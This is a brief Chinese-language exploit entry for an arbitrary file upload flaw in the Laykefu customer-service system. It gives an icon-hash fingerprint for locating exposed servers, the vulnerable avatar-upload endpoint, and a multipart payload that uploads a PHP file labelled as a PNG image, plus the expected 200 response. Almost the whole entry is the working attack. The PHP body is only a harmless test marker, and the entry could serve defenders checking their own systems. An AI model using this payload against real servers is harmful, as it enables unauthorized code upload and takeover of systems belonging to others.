# Laykefu客服系统任意文件上传漏洞

Laykefu ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="-334624619"`
- **请求**：`POST /admin/users/upavatar.html HTTP/1.1`

**Payload**
```
------WebKitFormBoundary3OCVBiwBVsNuB2kR
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: image/png
<?php echo "dudesite"; ?>
------WebKitFormBoundary3OCVBiwBVsNuB2kR--
```
- **响应特征**：200 ok